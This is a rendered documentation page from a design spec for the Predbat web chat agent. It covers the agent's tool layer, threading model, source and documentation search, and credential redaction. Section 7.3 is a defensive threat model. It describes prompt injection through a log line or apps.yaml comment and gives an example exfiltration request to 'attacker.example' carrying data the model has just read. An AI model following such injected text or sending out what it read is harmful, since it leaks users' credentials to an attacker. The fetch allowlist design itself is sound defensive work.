@@ -1,0 +1,1472 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../../img/favicon.ico" />
+    <title>Predbat Web Chat Agent — Design - Predbat Documentation</title>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Predbat Web Chat Agent \u2014 Design";
+        var mkdocs_page_input_path = "superpowers/specs/2026-08-27-web-chat-agent-design.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../../.." class="icon icon-home"> Predbat Documentation
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../..">Introduction</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../../what-does-predbat-do/">What does Predbat do?</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../../caution/">Words of caution</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Installing & configuring Predbat</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../installation-summary/">Install summary</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../install/">Install details</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../inverter-setup/">Inverter setup</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../apps-yaml/">apps.yaml settings</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../energy-rates/">Energy rates</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../components/">Predbat Components</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../load-ml/">ML Load Prediction</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../car-charging/">Car charging</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../configuration-guide/">Configuration guide</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../customisation/">Customisation</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../video-guides/">Video Guides</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../faq/">FAQ</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../devices/">Support 3rd party devices/integrations</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../manual-api/">Manual API</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Viewing Predbat data</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../output-data/">Output data</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../web-interface/">Web Interface</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../predbat-plan-card/">Predbat Plan card</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../creating-charts/">Creating the charts</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../compare/">Comparing Energy Tariffs</a>
+                  </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../../annual-prediction/">What If Annual Prediction</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Predbat development</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../todo-list/">To-do list</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../developing/">Developing on Predbat</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../random-scenarios/">Random Scenario Benchmarking</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../rest_api/">Predbat REST API</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../plugins/">🚀 Feature: Plugin System Implementation</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Predheat</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../../predheat/">Predheat</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../..">Predbat Documentation</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../../.." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Predbat Web Chat Agent — Design</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="predbat-web-chat-agent-design">Predbat Web Chat Agent — Design</h1>
+<p>Date: 2026-08-27
+Status: Approved for implementation planning</p>
+<p><strong>Prerequisite:</strong> this design assumes the nine-tool MCP surface from PR #4775
+(<code>feat/mcp-log-and-apps-redaction-4768</code>) — <code>get_log</code>, <code>get_state</code>, and <code>get_apps</code> with its
+<code>masked</code> argument, plus <code>is_secret_key</code> and <code>DEBUG_EXCLUDE_LIST</code> in <code>utils.py</code>. On <code>main</code> there
+are seven tools and <code>_execute_get_apps</code> returns <code>self.base.args</code> verbatim with no redaction at
+all, which would send every credential to a third-party model. <code>feat/web-chat-agent</code> is
+therefore branched from #4775 and rebases onto <code>main</code> once that merges.</p>
+<h2 id="0-changes-since-approval">0. Changes since approval</h2>
+<p>This spec was approved before implementation and the design moved while it was built. The
+sections below have been amended in place where they described configuration that no longer
+exists; this list covers the material divergences so a reader knows which decisions were revisited
+and why.</p>
+<ul>
+<li><strong>The endpoint is not necessarily OpenRouter.</strong> Any OpenAI-compatible API works, including a
+  local Ollama, verified against a real server. The single flat <code>openrouter_*</code> connection became
+  a <code>chat:</code> block of named providers (§9.1), since a hosted model and a local one can both be
+  worth having configured at once.</li>
+<li><strong>The component always starts</strong>, with no required arguments. The original gating meant an
+  unconfigured install had no component - but the Chat tab configures its own providers by
+  writing <code>apps.yaml</code>, so the component must exist before any provider does.</li>
+<li><strong>The model is optional.</strong> Chosen in the UI and remembered, so an install with only a key gets
+  a working tab rather than none.</li>
+<li><strong><code>chat_max_tool_calls</code> is <code>chat_max_tool_rounds</code></strong>, which is what it always bounded: every
+  tool call inside one round already runs.</li>
+<li><strong>One timeout became two.</strong> <code>chat_turn_timeout</code> (whole turn) and <code>chat_request_timeout</code> (one
+  completion) bound different things; sharing a value killed multi-round turns on their total
+  budget even when no single request was slow.</li>
+<li><strong>Approvals and errors are persisted beside the conversation</strong>, not among its messages, so they
+  survive a reconnect without ever being replayed to the model.</li>
+<li><strong>Documentation is read by section, not by page.</strong> <code>search_docs</code> returns a section id and
+  <code>read_docs</code> returns that section: fetching a whole docs page cost about 35,000 tokens where a
+  section answers the question in one or two.</li>
+<li><strong>Credential redaction is recursive.</strong> <code>mask_secret_args()</code> walked only top-level keys, so a
+  credential nested one level down - <code>forecast_solar[].api_key</code>, or anything in the <code>chat:</code> block</li>
+<li>was returned to the model in the clear.</li>
+</ul>
+<h2 id="1-purpose">1. Purpose</h2>
+<p>Add a <strong>Chat</strong> tab to the Predbat web interface, backed by an LLM served through OpenRouter,
+that can answer questions about the user's own system and change its settings. The agent is
+given Predbat's existing tool set directly as function-calling tools, so it can read the plan,
+the log, the live configuration, <code>apps.yaml</code> and Predbat's internal state, and — behind a
+confirmation gate — change a setting or override a plan slot. It can also search and read the
+Predbat documentation and Predbat's own source code, so "how do I configure X" and "what does
+this code actually do" are answerable as well as "what is my system doing".</p>
+<p>The feature exists so a user can ask <em>"why is it charging at 3am?"</em> or <em>"my export slot
+vanished, what happened?"</em> and get an answer grounded in their actual data, without having to
+export a debug YAML, open an issue, or wire up an external MCP client.</p>
+<p>Scope for this first implementation:</p>
+<ul>
+<li>A new <code>chat</code> component, enabled only when OpenRouter credentials and a model are configured
+  in <code>apps.yaml</code>.</li>
+<li>A shared tool layer, extracted from the MCP server so both surfaces call one implementation.</li>
+<li>Chat-local tools the MCP server does not get: the conversation title, documentation search,
+  source-code search and read, and an allowlisted URL fetch.</li>
+<li>Multiple saved conversations with a switcher, persisted through the Storage component. One
+  turn runs at a time across the whole component; other conversations stay readable while it does.</li>
+<li>Server-sent-event streaming of tokens, tool calls and confirmations to the browser.</li>
+<li>A write-confirmation gate, on by default, controlled by a Predbat switch.</li>
+<li>A model picker, per conversation, defaulting to the <code>apps.yaml</code> model.</li>
+<li>Optional OpenRouter web search, behind a switch that is off by default.</li>
+</ul>
+<p>Explicitly out of scope, listed in section 19.</p>
+<h2 id="2-why-not-drive-the-existing-mcp-server">2. Why not drive the existing MCP server</h2>
+<p>The chat agent does <strong>not</strong> speak MCP. It presents the tools to the model directly in
+OpenAI function-calling form and executes them in-process.</p>
+<p>Speaking MCP would mean the chat component acting as an HTTP MCP client against Predbat's own
+MCP server: a second port, an OAuth or bearer handshake against ourselves, a JSON-RPC envelope
+in each direction, and a hard dependency on <code>mcp_enable</code> being switched on. All of that to
+reach Python methods that are already in the same process. The protocol buys nothing here —
+its value is crossing a process boundary, and there is no boundary to cross.</p>
+<p>The MCP tool set is also much richer than the real REST API, which is only <code>/api/state</code> and
+<code>/api/service</code> (<code>docs/rest_api.md</code>). Routing chat through HTTP endpoints would mean first
+building seven new REST endpoints to reach parity. The tools are therefore extracted into a
+shared Python layer that both the MCP server and the chat agent project into their own schema
+dialect.</p>
+<h2 id="3-the-constraint-that-shapes-everything-one-thread-per-component">3. The constraint that shapes everything: one thread per component</h2>
+<p><code>Hass.create_task()</code> (<code>apps/predbat/hass.py:223</code>) starts a <strong>new thread</strong> per component, each
+running its own <code>asyncio.run()</code>. Components therefore do not share an event loop.</p>
+<p>The existing house pattern, seen in <code>WebInterface.html_component_restart</code>
+(<code>apps/predbat/web.py:4866</code>), is for a web handler to <code>await</code> another component's coroutine
+directly — which executes that coroutine on the <em>web</em> component's loop, not the owning
+component's. This works only because those coroutines hold no loop-bound state.</p>
+<p><strong>The chat component must obey the same rule.</strong> Concretely:</p>
+<ul>
+<li><code>aiohttp.ClientSession</code> is created per request inside an <code>async with</code>, as <code>axle.py:250</code> does.
+  No session is cached on the component.</li>
+<li>Shared state (conversation index, message bodies, event buffer, pending confirmations) uses
+  plain lists/dicts guarded by a <code>threading.Lock</code>, never <code>asyncio.Queue</code>, <code>asyncio.Event</code> or
+  <code>asyncio.Lock</code>.</li>
+<li>The confirmation gate is polled, not awaited on a synchronisation primitive: the parked
+  turn loops on <code>await asyncio.sleep(0.2)</code> reading <code>pending_confirm</code> under the lock. This
+  needs no thread and no loop-bound object, and matches the cursor polling the SSE handler
+  already uses.</li>
+</ul>
+<p>The chat component's own thread does only housekeeping: periodic persistence flush, pruning and
+the health timestamp. The agentic turn itself runs on whichever loop invoked it, which in
+practice is the web server's.</p>
+<p>This is a deliberate departure from how a component would normally own its work, and it is the
+reason the design is testable without a web server: <code>ChatAgent.run_turn()</code> is an ordinary
+coroutine that can be awaited from a test.</p>
+<h2 id="4-architecture">4. Architecture</h2>
+<p>Five new files, one refactor. No existing module changes behaviour except <code>web_mcp.py</code>, which is
+refactored without changing its contract, and the small hooks in <code>web.py</code>, <code>web_helper.py</code>,
+<code>components.py</code> and <code>config.py</code>.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>apps/predbat/agent_tools.py</code></td>
+<td><code>PredbatTools</code> and <code>TOOL_DEFS</code>; the single implementation of the nine Predbat tools, shared with MCP</td>
+</tr>
+<tr>
+<td><code>apps/predbat/chat_store.py</code></td>
+<td><code>ConversationStore</code>; the conversation index, bodies, persistence, expiry, pruning and history trimming</td>
+</tr>
+<tr>
+<td><code>apps/predbat/chat_tools.py</code></td>
+<td><code>CHAT_TOOL_DEFS</code> and the chat-local tool implementations: documentation search, source search and read, and the allowlisted URL fetch</td>
+</tr>
+<tr>
+<td><code>apps/predbat/chat.py</code></td>
+<td><code>ChatAgent(ComponentBase)</code>; OpenRouter client, agentic loop, chat-local tools, confirmation gate</td>
+</tr>
+<tr>
+<td><code>apps/predbat/web_chat.py</code></td>
+<td><code>WebChat</code>; the Chat tab page and its routes</td>
+</tr>
+<tr>
+<td><code>apps/predbat/web_mcp.py</code></td>
+<td><em>refactored</em>: <code>MCPServerWrapper(PredbatTools)</code>, keeping only the protocol envelope</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-text">browser ──HTTP/SSE──▶ web_chat.WebChat ──await──▶ chat.ChatAgent ──HTTPS──▶ OpenRouter
+                                                        │
+                                                        ├─▶ agent_tools.PredbatTools ─▶ base (PredBat)
+                                                        │              ▲
+                                                        │  MCP client ─┴─JSON-RPC─▶ web_mcp.MCPServerWrapper
+                                                        ├─▶ chat_store.ConversationStore ─▶ storage
+                                                        └─▶ chat_tools (docs, source, fetch)
+</code></pre>
+<p>Splitting the conversation store and the chat-local tools out of <code>chat.py</code> keeps each file to
+one job: the component file is the agent loop and nothing else, and both of the others are
+testable with no LLM in sight.</p>
+<h2 id="5-tools">5. Tools</h2>
+<h3 id="51-predbattools-the-shared-nine">5.1 <code>PredbatTools</code> — the shared nine</h3>
+<p><code>PredbatTools</code> takes <code>(base, log_func)</code> and holds the nine <code>_execute_*</code> coroutines lifted
+verbatim out of <code>MCPServerWrapper</code>, together with the module-level helpers they use
+(<code>json_safe_value</code>, <code>summarise_state_value</code>, <code>measure_state_value</code>, <code>parse_number_argument</code>,
+<code>compile_filter_argument</code>, <code>parse_bool_argument</code>, <code>MCPArgumentError</code>) and their constants
+(<code>LOG_FILTER_TYPES</code>, <code>MCP_LOG_*</code>, <code>MCP_STATE_*</code>).</p>
+<p>The constants keep their <code>MCP_</code> prefix. Renaming them would churn
+<code>apps/predbat/tests/test_web_mcp.py</code> for no benefit, and they describe the tool contract rather
+than the protocol.</p>
+<p><code>web_mcp.py</code> re-exports every moved name (<code>from agent_tools import PredbatTools, LOG_FILTER_TYPES, ...</code>)
+so existing imports in tests and elsewhere continue to resolve.</p>
+<p><code>MCPServerWrapper</code> becomes <code>class MCPServerWrapper(PredbatTools)</code> and keeps only OAuth, the
+JSON-RPC envelope, <code>_handle_initialize</code>, <code>_handle_tools_list</code> and <code>_handle_tools_call</code>. Because
+it inherits the handlers, existing tests that call <code>mcp._execute_get_log(...)</code> keep working
+untouched.</p>
+<h3 id="52-tool_defs-and-the-two-projections">5.2 <code>TOOL_DEFS</code> and the two projections</h3>
+<p>A module-level list, one entry per tool, in the order the MCP server lists them today:</p>
+<pre><code class="language-python">TOOL_DEFS = [
+    {
+        &quot;name&quot;: &quot;get_apps&quot;,
+        &quot;description&quot;: &quot;Get predbat apps.yaml static configuration data, ...&quot;,
+        &quot;parameters&quot;: {&quot;type&quot;: &quot;object&quot;, &quot;properties&quot;: {...}, &quot;required&quot;: []},
+        &quot;writes&quot;: False,
+        &quot;chat_omit_properties&quot;: [&quot;masked&quot;],
+    },
+    ...
+]
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>name</code>, <code>description</code>, <code>parameters</code></td>
+<td>Exactly the values the MCP server publishes today</td>
+</tr>
+<tr>
+<td><code>writes</code></td>
+<td><code>True</code> for <code>set_config</code> and <code>set_plan_override</code>, <code>False</code> for the other seven. It means "changes Predbat's configuration or plan", which is what the confirmation gate is about — not "has any side effect"</td>
+</tr>
+<tr>
+<td><code>chat_omit_properties</code></td>
+<td>Properties removed from the <em>chat</em> projection only (section 14.1)</td>
+</tr>
+</tbody>
+</table>
+<p>Two projections and one dispatcher:</p>
+<ul>
+<li><code>mcp_tool_list()</code> → <code>[{"name", "description", "inputSchema": parameters}]</code></li>
+<li><code>openai_tool_list(defs=TOOL_DEFS)</code> → <code>[{"type": "function", "function": {"name", "description", "parameters"}}]</code>,
+  with <code>chat_omit_properties</code> stripped from <code>properties</code></li>
+<li><code>async execute(name, arguments)</code> → the tool's result dict, or
+  <code>{"success": False, "error": "Unknown tool: ..."}</code></li>
+</ul>
+<p><code>_handle_tools_list</code> becomes <code>return {"tools": mcp_tool_list()}</code> and <code>_handle_tools_call</code>
+becomes <code>execute()</code> plus the MCP content envelope. A golden test asserts <code>mcp_tool_list()</code> is
+identical to the list <code>web_mcp.py</code> publishes today, so the refactor cannot silently change the
+MCP contract.</p>
+<h3 id="53-chat_tool_defs-five-tools-mcp-does-not-get">5.3 <code>CHAT_TOOL_DEFS</code> — five tools MCP does not get</h3>
+<p>Defined in <code>chat_tools.py</code>, in the same shape, and projected with the same
+<code>openai_tool_list(CHAT_TOOL_DEFS)</code> helper. The model is offered
+<code>openai_tool_list() + openai_tool_list(CHAT_TOOL_DEFS)</code>; dispatch tries the chat-local handlers
+first and falls through to <code>PredbatTools.execute()</code>.</p>
+<p>They are chat-local for two different reasons. <code>set_chat_title</code> needs the conversation the turn
+belongs to, which <code>PredbatTools</code> knows nothing about. The other four are not about the user's
+Predbat instance at all, and an MCP client already has its own file and web tools — adding ours
+would be noise in someone else's tool list.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Arguments</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>set_chat_title</code></td>
+<td><code>title</code> (string)</td>
+<td>Sets the current conversation's title</td>
+</tr>
+<tr>
+<td><code>search_docs</code></td>
+<td><code>query</code> (string), <code>max_results</code> (integer, default 5, max 10)</td>
+<td><code>[{title, url, excerpt}]</code> from the Predbat documentation</td>
+</tr>
+<tr>
+<td><code>search_source</code></td>
+<td><code>pattern</code> (regex string), <code>file</code> (string, optional), <code>max_results</code> (integer, default 20, max 100)</td>
+<td><code>[{file, line, text}]</code> plus <code>total_matches</code></td>
+</tr>
+<tr>
+<td><code>read_source</code></td>
+<td><code>file</code> (string), <code>start_line</code> (integer, default 1), <code>max_lines</code> (integer, default 200, max 400)</td>
+<td>Numbered source lines plus <code>total_lines</code></td>
+</tr>
+<tr>
+<td><code>fetch_url</code></td>
+<td><code>url</code> (string)</td>
+<td>The page as text, subject to the allowlist in section 7.3</td>
+</tr>
+</tbody>
+</table>
+<p>None of the five has <code>writes: True</code> — none changes Predbat's configuration or plan, so none
+goes through the confirmation gate. The source tools are read-only by construction; <code>fetch_url</code>
+is the security-sensitive one, for the reasons in section 7.3.</p>
+<h2 id="6-conversation-titles">6. Conversation titles</h2>
+<p>Titles come from the model. The system prompt says, when and only when the conversation is still
+called <code>New chat</code>:</p>
+<blockquote>
+<p>This conversation has no title yet. Call <code>set_chat_title</code> once, early in your reply, with a
+short descriptive title of at most 60 characters summarising what the user is asking about.</p>
+</blockquote>
+<p><code>set_chat_title</code> trims the string, collapses whitespace, truncates to 60 characters, rejects an
+empty result, updates the conversation metadata, marks it dirty and emits a <code>title</code> event so
+every open browser relabels the row live.</p>
+<p><strong>A fallback is still required.</strong> Weaker models ignore instructions, and a conversation stuck at
+<code>New chat</code> is worse than a crude title. So if the conversation is still untitled when the first
+turn ends, the title is derived from the first user message — whitespace collapsed, truncated to
+60 characters. The model gets first refusal; the fallback guarantees an answer.</p>
+<p>A later <code>set_chat_title</code> call is accepted rather than refused, since a conversation that has
+genuinely changed topic is better retitled. The prompt only mentions the tool while untitled, so
+this should be rare. The user can always rename by hand.</p>
+<p>Titles are user-influenced text and are escaped before rendering (section 14.7).</p>
+<h2 id="7-documentation-source-code-and-the-web">7. Documentation, source code and the web</h2>
+<h3 id="71-search_docs">7.1 <code>search_docs</code></h3>
+<p>Predbat's documentation is not on disk — <code>download.py</code> installs only <code>apps/predbat/*</code>, not
+<code>docs/</code>. The published MkDocs site does ship a search index at
+<code>https://springfall2008.github.io/batpred/search/search_index.json</code>, shaped
+<code>{config, docs: [{location, title, text}]}</code>.</p>
+<p><code>search_docs</code> fetches that index through
+<code>storage.fetch_cached("chat", "docs_index", ..., fresh_minutes=1440, format="json")</code>, keeps one
+parsed copy on the component, and scores records locally: query terms of three characters or
+more, lowercased, counted across <code>title</code> (weighted) and <code>text</code>. It returns the top <code>max_results</code>
+as <code>{title, url, excerpt}</code>, where <code>url</code> is the site root joined to <code>location</code> and <code>excerpt</code> is
+roughly 300 characters around the best match.</p>
+<p>One cached fetch a day, no third-party search service, no per-query cost, and it works whatever
+the configured provider points at. The URL is hardcoded, so this tool carries none of the risk in
+section 7.3.</p>
+<p>If the index cannot be fetched, the tool returns
+<code>{"success": false, "error": "Documentation index unavailable"}</code> and the model falls back to
+what it knows.</p>
+<p><strong>Documentation is fetched rather than shipped, deliberately.</strong> Installing <code>docs/</code> alongside the
+source would make this tool offline and exactly version-matched, which is the same argument that
+puts source reading locally (section 7.2). It is rejected here because the cost lands in the
+wrong place: <code>match_archive_member</code> (<code>apps/predbat/download.py:325</code>) accepts only files sitting
+directly in <code>apps/predbat</code>, and staging is flat — <code>&lt;filename&gt;.&lt;tag&gt;</code> beside the installed file.
+Shipping docs means teaching the updater a second root <em>and</em> nested paths, creating directories
+during staging, extending the rollback that removes staged files, and adding a second GitHub
+directory listing — all inside the SHA1-verified staged-update path, which is the code whose
+failure mode is a broken install. The published index already gives version-current
+documentation for one cached request a day.</p>
+<p>Should that trade ever change, <code>search_docs</code> can prefer a local <code>docs/</code> when one exists and fall
+back to the index otherwise; <code>.md</code> is already on the source allowlist (section 7.2) so nothing
+else would need to move.</p>
+<h3 id="72-search_source-and-read_source-local-not-github">7.2 <code>search_source</code> and <code>read_source</code> — local, not GitHub</h3>
+<p><strong>The source is already on disk.</strong> Predbat is a Python application that reads its own directory
+throughout (<code>os.path.dirname(os.path.abspath(__file__))</code>, the house pattern at
+<code>apps/predbat/hass.py:26</code> and <code>apps/predbat/web.py:5372</code>), and <code>download.py</code> installs exactly
+<code>apps/predbat/*</code>. Reading it needs no network at all.</p>
+<p>Local beats GitHub on the thing that matters most for this feature: <strong>the installed source is
+the exact version the user is running.</strong> Someone on an old release, or a dev branch, debugging
+"why did my plan do that", is badly served by an answer drawn from whatever <code>main</code> looks like
+today — a confidently wrong answer about code they are not running is worse than no answer. It
+is also free, works offline, and is not subject to the 60-requests-an-hour unauthenticated
+GitHub rate limit.</p>
+<p>GitHub is not lost, either: <code>github.com</code> and <code>raw.githubusercontent.com</code> are already on the
+<code>fetch_url</code> allowlist (section 7.3), so history, issues, pull requests and other branches remain
+reachable when the model genuinely needs them rather than as the default path to the code.</p>
+<p><code>search_source(pattern, file=None, max_results=20)</code> walks the source root for source files,
+skipping <code>venv/</code> and <code>__pycache__/</code>, and returns <code>{file, line, text}</code> for each regex match with the line
+truncated to 300 characters, plus a <code>total_matches</code> count so a truncated result is visible as
+truncated rather than silently short. <code>file</code> narrows the search to one path.</p>
+<p><code>read_source(file, start_line=1, max_lines=200)</code> returns a numbered slice plus <code>total_lines</code>, so
+the model can page through <code>plan.py</code> rather than trying to swallow it. Search first, read second:
+<code>predbat.py</code> and <code>plan.py</code> are thousands of lines, and no whole-file read is ever offered.</p>
+<p>Both enforce:</p>
+<ol>
+<li>The path is resolved with <code>os.path.realpath</code> and must remain under the realpath of the source
+   root, which blocks <code>../</code> traversal and symlinks pointing outward.</li>
+<li><strong>The extension must be on the allowlist</strong>: <code>.py</code>, <code>.cpp</code>, <code>.h</code>, <code>.hpp</code>, <code>.proto</code>, <code>.sh</code>,
+   <code>.md</code>. That covers every file type Predbat's source actually uses — 312 <code>.py</code>, the
+   <code>prediction_kernel.cpp</code>, two <code>.proto</code> defining the Enphase and gateway wire formats, two
+   build <code>.sh</code> that answer "why will the kernel not build on my Pi" — plus <code>.h</code>/<code>.hpp</code> so a
+   future kernel header split needs no change here, and <code>.md</code> so the tool works unchanged if
+   documentation ever lands locally (section 7.1). It is deliberately an <strong>allowlist, not a
+   denylist</strong>, and deliberately an extension rule rather than a directory rule. Section 7.2.1
+   explains why.</li>
+<li><code>venv/</code> and <code>__pycache__/</code> are skipped, or a search would drag in every installed dependency.</li>
+<li>Caps: 100 matches, 400 lines, 64 KB per response, and a wall-clock budget on the scan. A
+   pattern over 200 characters, or one <code>re.compile</code> rejects, returns a plain error rather than
+   raising.</li>
+</ol>
+<p>Predbat's source is a public repository, so this exposes nothing that is not already public.
+The guards exist to stop the tool reaching <em>beyond</em> the source into configuration and logs.</p>
+<h4 id="721-why-an-allowlist-rather-than-everything-except-yaml">7.2.1 Why an allowlist rather than "everything except <code>.yaml</code>"</h4>
+<p>A directory rule cannot work, because the source directory and the configuration directory can
+be the same one. <code>CONFIG_ROOTS</code> is <code>["/config", "/conf", "/homeassistant", "./"]</code>
+(<code>apps/predbat/const.py:33</code>), so <code>config_root</code> falls back to the working directory — which for
+a Docker or from-source run is the source directory itself. <code>StorageLocalFiles</code> then puts its
+cache at <code>config_root/cache</code> (<code>apps/predbat/storage.py:199</code>), inside the tree being searched.</p>
+<p>A checkout additionally carries <code>apps/predbat/config/apps.yaml</code> and <code>config/secrets.yaml</code>.
+Those are not present on an add-on install, because <code>match_archive_member</code>
+(<code>apps/predbat/download.py:325</code>) installs only files sitting <em>directly</em> in <code>apps/predbat</code> and
+excludes every subdirectory — but anyone running Predbat from a clone has them right there.</p>
+<p>That makes the source tree a plausible home for all of the following:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Why excluding only <code>.yaml</code> would not be enough</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cache/*.json</code></td>
+<td>Storage cache — whatever components persisted, including OAuth tokens</td>
+</tr>
+<tr>
+<td><code>predbat.log</code></td>
+<td>Up to 10 MB, and the raw log is what <code>get_log</code> deliberately filters</td>
+</tr>
+<tr>
+<td><code>*.bak</code></td>
+<td>A backup of a config file wears the backup's extension, not the original's</td>
+</tr>
+<tr>
+<td><code>*.so</code>, <code>*.pyc</code></td>
+<td>Megabytes of binary, useless in a context window</td>
+</tr>
+<tr>
+<td><code>*.yml</code></td>
+<td>The same YAML with the other spelling</td>
+</tr>
+<tr>
+<td><code>.env</code></td>
+<td>Not present today; nothing stops a user adding one</td>
+</tr>
+</tbody>
+</table>
+<p>A denylist has to anticipate every extension a secret might arrive wearing, and is wrong the
+first time one arrives in a new one. An allowlist only has to name the extensions source code
+wears, which is a closed and short list. The cost of being wrong is asymmetric — a missing
+extension means the agent cannot read one file, while a missing denylist entry means credentials
+go to a third-party model — so the allowlist is the right default even though it is the less
+convenient one.</p>
+<p>If a user genuinely needs another extension, widening the constant is a one-line change with a
+visible diff, which is the right place for that decision to be made.</p>
+<h3 id="73-fetch_url-and-why-it-is-fenced">7.3 <code>fetch_url</code> and why it is fenced</h3>
+<p>An unrestricted fetch tool is an <strong>exfiltration channel</strong>, which matters more here than SSRF: a
+prompt-injected log line or <code>apps.yaml</code> comment could steer the model into
+<code>GET https://attacker.example/?d=&lt;something it just read&gt;</code>. The allowlist is the control that
+closes it, and it is not optional.</p>
+<p><code>fetch_url</code> enforces, in order:</p>
+<ol>
+<li>Scheme must be <code>https</code>.</li>
+<li>Host must appear in the allowlist. Default
+   <code>["springfall2008.github.io", "github.com", "raw.githubusercontent.com"]</code>, replaceable via
+   <code>chat_fetch_allowlist</code> in <code>apps.yaml</code>. Matching is exact hostname or a <code>.suffix</code> match, never
+   a substring — <code>evilspringfall2008.github.io</code> must not pass.</li>
+<li>The hostname is resolved, and the request is refused if <strong>any</strong> returned address is private,
+   loopback, link-local, reserved or multicast (<code>ipaddress.ip_address(...)</code>). This stops an
+   allowlisted host that resolves inward.</li>
+<li>Redirects are not followed automatically. Each hop is re-validated against steps 1-3, to a
+   maximum of three.</li>
+<li>Response <code>Content-Type</code> must be <code>text/*</code> or <code>application/json</code>; the body is capped at 200 KB
+   and truncated with a visible note. HTML is reduced to text by stripping tags, scripts and
+   styles.</li>
+<li>Timeout 20 s.</li>
+</ol>
+<p>Every rejection returns a plain error to the model naming the reason, so it can explain itself
+rather than retry blindly. The call and its argument appear in the transcript like any other
+tool call, so the user can see exactly what was fetched.</p>
+<h3 id="74-openrouter-web-search">7.4 OpenRouter web search</h3>
+<p>OpenRouter provides web <em>search</em>, not fetch: <code>plugins: [{"id": "web"}]</code> (equivalently the
+<code>:online</code> model suffix) injects search excerpts into the prompt with <code>url_citation</code> annotations,
+backed by each provider's native search where available and Exa otherwise, at roughly
+$0.001-0.015 per request.</p>
+<p>A <code>chat_web_search</code> switch, <strong>default off</strong>, adds the plugin to the request body. When results
+come back, the <code>url_citation</code> annotations are rendered as a sources list under the message.</p>
